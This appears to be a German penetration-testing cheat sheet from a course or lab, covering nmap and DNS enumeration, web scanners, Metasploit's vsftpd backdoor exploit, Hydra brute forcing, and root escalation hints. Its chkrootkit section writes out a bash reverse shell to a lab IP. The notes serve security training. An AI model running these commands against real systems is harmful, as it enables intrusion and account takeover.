Enumeration

netcat Portscan [S2F29/49]
Scan aller Ports:
nmap -Pn -sS -p - -vv -oA filename targetIP

nmap -Pn -sS -p - -vv -oA scanresult.txt 10.0.2.15

nmap -Pn -sS -p - -vv -oA nmap_scan_Pn_sS_p_-vv_oA_targetIP targetIP | tee nmap_scan_Pn_sS_p-_vv_oA_targetIP

nmap -Pn -sS -p - -vv -oA nmap_scan_Pn_sS_p_-vv_oA_10.0.2.6 10.0.2.6 | tee nmap_scan_Pn_sS_p-_vv_oA_10.0.2.6


Service Scan:
nmap -Pn -sV -p ports -vv -oA filename targetIP

nmap -Pn -sV -p ports -vv -oA nmap_scan_Pn_sV_p_ports_vv_oA_ targetIP targetIP

nmap -Pn -sV -p 21,22,25,80 -vv -oA vulnweb.com_servicescan vulnweb.com


NSE Script Scan:
nmap -Pn -sC -vv -p ports -oA filename targetIP

nmap -Pn -sC -vv -p 80 -oA vulnweb.com_http vulnweb.com

nmap -Pn -sC -vv -p 22,53,80,110,111,139,143,445,993,995,8080,52062 -oA nmap_Pn_sC_vv_p_22,53,80,110,111,139,143,445,993,995,8080,52062_10.0.2.6 10.0.2.6 | tee nmap_Pn_sC_vv_p_22,53,80,110,111,139,143,445,993,995,8080,52062_10.0.2.6

DNS Enumeration Script:
nmap -sSU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=example.com 10.0.2.6

http Enumeration Script:
nmap -sV --script=/usr/share/nmap/scripts/http-enum 10.0.2.6 | tee nmap_http-enum_sV_10.0.2.6

host zonetransfer.me DNS [S2F33/49]
DOM=zonetransfer.me; for srv in $(host -t ns ${DOM} | cut -d " " -f4); do
host -l ${DOM} ${srv} | grep "has address"; done | tee host_zonetransfer.me

dig DNS [S2F33/49]
dig 10.0.2.6 | tee dig_10.0.2.6

dig targetIP/targetHostname | tee dig_targetIP/targetHostname


dig +short ns zonetransfer.me
dig +short ns 10.0.2.6
dig +short ns targetIP/Hostname

The resulting hostname can be used in:
dig axfr targetIP/Hostname @nameserverIP/Hostname
dig axfr zonetransfer.me @nsztm1.digi.ninja.

from: https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
https://hackertarget.com/zone-transfer/
https://digi.ninja/projects/zonetransferme.php

DNSRecon [S2F33/49]
dnsrecon -d targetIP/Hostname -t axfr | tee

dnsrecon_targetIP/Hostname

dnsrecon -d 10.0.2.6 -t axfr | tee dnsrecon_10.0.2.6

Server Message Block Protocol [S2F34/49]
Port TCP/UDP 137-139 und TCP 445

nbtscan targetIP | tee nbtscan_targetIP

nbtscan 10.0.2.6 | tee nbtscan_10.0.2.6


enum4linux [S2F34/49]
enum4linux targetIP | tee enum4linux_targetIP

enum4linux 10.0.2.6 | tee enum4linux_10.0.2.6


snmpwalk [S2F38/49]

snmpwalk -v 2c -c public 10.0.2.6 | tee snmpwalk_10.0.2.6


nikto [S2F39/49]

nikto -host targetIP | tee nikto_targetIP

nikto -host 10.0.2.6 | tee nikto_10.0.2.6


gobuster

gobuster dir -k -u http://targetIP -w /usr/share/dirb/wordlists/common.txt -e | tee /home/kali/Documents/Pruefung/gobuster_targetIP

gobuster dir -k -u http://10.0.2.6 -w /usr/share/dirb/wordlists/common.txt -e | tee /home/kali/Documents/Lab1/gobuster_10.0.2.6

https://www.sevenlayers.com/index.php/233-vulnhub-hackfest2016-sedna-walkthrough

-k Skip SSL certificate verification
-u The target URL or Domain
-w Path to wordlist
-e Expanded mode, print full URLs

sslscan [S2F40/49]

sslscan targetIP | tee sslscan_targetIP

sslscan 10.0.2.6 | tee sslscan_10.0.2.6


dirb [S2F41/49]

dirb http://targetIP | tee dirb_http targetIP

dirb http://10.0.2.6 | tee dirb_http10.0.2.6


dirb http://targetIP -w | tee dirb_w_httptargetIP

dirb http://10.0.2.6 -w | tee dirb_w_http10.0.2.6


WPScan [S3F43/49]

wpscan --url targetIP --enumerate p --enumerate u | tee WPScan_targetIP

wpscan --url 10.0.2.6 --enumerate p --enumerate u | tee WPScan_10.0.2.6




Exploitation

mfs - Metasploit Framework [S3F37/49]

Vor dem start kann optional die msfdb initialisiert werden.
msfdb init
oder um die msfdb zu reinitialisieren (alle vorhandenen Daten werden gelöscht):
msfdb reinit

mfsconsole
Startet das metasploit framework.

search <exploit-name>
search vsftpd
Hier sind dann die gefundenen Exploits gelistet.

use <number or exploit-name>
use 2
use exploit/unix/ftp/vsftpd_234_backdoor
Der Exploit kann entweder mit der Zahl oder mit dem Pfad+Exploit-Namen ausgewählt werden.

show options
Hier sind dann die benötigten Variablen, wie Hosts, IP-Adressen und Ports gelistet.

set <variable> <value>
set rhosts 192.168.1.2

exploit
Starte den Exploit.

exit
Metasploit framework verlassen.

Meterpreter Basics
https://www.offsec.com/metasploit-unleashed/meterpreter-basics/


Brute Force [S2F39/49]

Hydra

hydra -l Barry -P Documents/Lab3/rockyou.txt 10.0.0.31 ssh -t 64

-l Username
-L File with Usernames
-t threads, default: 16, max: 64
-P Wordlist

hydra -L <username_list_file.ext> -P /usr/share/wordlists/rockyou.txt -o <output_file.ext> <service>:<server> -F

(Attempt Hydra to choose usernames and passwords from given lists (-L) using a password list (-P //usr/share/wordlists/rockyou.txt) on the given server (http:/ 192.168.1.123))

John The Ripper
ocl Hashcat

sqlmap

sqlmap --wizard

Python Fileserver im aktuellen Ordner hosten [S2F39/49]

Es kann im aktuellen Ordner ein Python-Fileserver gehostet werden, um von einem anderen Rechner gewünschte Files herunterzuladen.

python2 -m SimpleHTTPServer 8080
python2 -m SimpleHTTPServer <Port>


python3 -m http.server 8080


Lokal zu root


Wordpress config Datei enthält DB Passwort.


Ubuntu overlayfs


suid binaries


sudo -i


Wiederverwendete Passwörter


Docker container zu root


Chkrootkit [S3F56-57/61]

Lokal werden. chkrootkit in Enumeration finden. IP-Adresse vom Host im update-Skript anpassen.

update:
#! /bin/bash 
bash -i >& /dev/tcp/listeningHostIP/NClisteningPort 0>&1

#! /bin/bash 
bash -i >& /dev/tcp/10.0.2.4/5555 0>&1

NC auf den Listening Port einstellen und warten.
update-Datei in /tmp verschieben und chmod +x ausführen. 





Helpful Links

CyberChef:
https://gchq.github.io/CyberChef/

Reverse Shell Cheat Sheet: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python

Pentestmonkey: Reverse Shell Chear Sheet:
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


Link zum HedgeDoc Markdown Document:
https://pad.sfz-aalen.space/ifykBq_yRcSQfrFXWgfZdA?view#
